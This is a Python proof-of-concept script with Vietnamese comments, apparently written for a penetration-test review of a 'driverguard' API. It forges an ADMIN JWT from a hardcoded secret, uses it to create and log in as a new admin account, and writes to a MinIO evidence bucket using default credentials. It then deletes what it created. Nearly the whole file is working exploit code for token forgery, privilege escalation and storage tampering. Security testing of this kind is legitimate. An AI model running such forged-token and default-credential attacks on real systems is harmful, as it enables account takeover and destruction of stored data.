#!/usr/bin/env python3
"""
P-136 — PoC TÁC ĐỘNG CÓ KIỂM SOÁT + ĐẢO NGƯỢC (không phá dữ liệu thật):
  (E) Dùng token ADMIN GIẢ MẠO (secret hardcode) tạo 1 user ADMIN mới -> chứng minh leo quyền bền vững
      -> rồi XOÁ user đó (dọn dẹp).  => chứng minh quyền ghi/xoá dữ liệu.
  (F) Ghi 1 object test vào MinIO bằng default creds -> rồi XOÁ.  => chứng minh ghi/xoá kho bằng chứng.
Tất cả artifact do script tạo đều được xoá ngay. KHÔNG đụng user/evidence thật.
"""
import json, time, uuid
import jwt, requests
import boto3
from botocore.client import Config

BASE = "http://<REDACTED_IP>:8000/api/v1"
SECRET = "<REDACTED_JWT_SECRET>"
OUT = "/home/hieubt15/Documents/demo-review-cohort4/reviews/P-136/evidences"
log = {"ts": time.strftime("%Y-%m-%d %H:%M:%S%z"), "steps": []}

def rec(**k):
    log["steps"].append(k); print(k)

# forge admin token (không đăng nhập)
now = int(time.time())
tok = jwt.encode({"sub": "usr_admin_0001", "username": "admin", "email": "<REDACTED_EMAIL>",
                  "role": "ADMIN", "permissions": ["*"], "iat": now, "exp": now + 3600,
                  "iss": "driverguard-auth-service", "token_type": "access"}, SECRET, algorithm="HS256")
H = {"Authorization": f"Bearer {tok}"}

# (E) tạo user ADMIN mới
uname = f"zz_sectest_{uuid.uuid4().hex[:6]}"
payload = {"username": uname, "password": "SecTest@123", "full_name": "SECURITY TEST - XOA NGAY",
           "role": "ADMIN", "email": f"{uname}@sectest.local"}
r = requests.post(f"{BASE}/users", headers=H, json=payload, timeout=20)
rec(step="create_admin_user", status=r.status_code, body=r.json() if r.ok else r.text[:300])
new_id = r.json()["data"]["id"] if r.ok else None

# chứng minh user mới ĐĂNG NHẬP ĐƯỢC với quyền ADMIN
if new_id:
    rl = requests.post(f"{BASE}/auth/login", json={"username": uname, "password": "SecTest@123"}, timeout=20)
    rec(step="login_new_admin", status=rl.status_code, role=(rl.json().get("data",{}).get("user",{}).get("role") if rl.ok else None))

# (E-cleanup) XOÁ user test
if new_id:
    rd = requests.delete(f"{BASE}/users/{new_id}", headers=H, timeout=20)
    rec(step="delete_test_user(cleanup)", status=rd.status_code, body=rd.json() if rd.ok else rd.text[:200])

# (F) MinIO ghi + xoá object test
try:
    s3 = boto3.client("s3", endpoint_url="http://<REDACTED_IP>:9000",
                      aws_access_key_id="<REDACTED_MINIO_USER>", aws_secret_access_key="<REDACTED_MINIO_PASS>",
                      config=Config(signature_version="s3v4"), region_name="us-east-1")
    key = f"sectest/PROOF_WRITE_{uuid.uuid4().hex[:6]}.txt"
    s3.put_object(Bucket="driverguard-evidence", Key=key,
                  Body=b"P-136 security test: proof of write access. Deleted immediately.")
    rec(step="minio_put_object", key=key, result="OK (ghi được)")
    head = s3.head_object(Bucket="driverguard-evidence", Key=key)
    rec(step="minio_verify", size=head["ContentLength"])
    s3.delete_object(Bucket="driverguard-evidence", Key=key)
    rec(step="minio_delete_object(cleanup)", key=key, result="OK (đã xoá)")
except Exception as e:
    rec(step="minio_error", error=str(e)[:200])

log["ket_luan"] = ("Token admin GIẢ MẠO có thể TẠO user ADMIN mới (leo quyền bền vững) và XOÁ user; "
                   "MinIO default creds cho GHI/XOÁ object kho bằng chứng. "
                   "Tất cả artifact test đã được dọn. Downtime=0, dữ liệu thật không bị đụng. "
                   "=> Cùng quyền này đủ để xoá sạch toàn bộ user/evidence của hệ thống.")
json.dump(log, open(f"{OUT}/04_controlled_impact.json", "w"), ensure_ascii=False, indent=2, default=str)
print("saved ->", f"{OUT}/04_controlled_impact.json")
